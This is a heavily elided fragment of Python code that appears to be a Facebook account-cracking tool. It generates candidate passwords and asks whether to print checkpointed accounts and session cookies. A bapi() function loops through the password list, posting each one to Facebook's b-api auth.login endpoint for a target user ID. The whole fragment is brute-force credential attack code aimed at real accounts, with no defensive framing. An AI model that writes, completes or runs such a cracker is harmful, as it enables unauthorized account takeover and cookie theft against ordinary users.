...
def random_number():
    ...
    for i in range(limit):
        ...
        if len(password) >= 6:
            pwx.append(password)
    logo()
    cp_show = input("[+] Do You WantTo Rrint CP (y/n): ")
    coki_show = input("[+] Do You WantTo Print Cookie (y/n): ")
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        for pw in pwx:
            ...
            responce = session.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
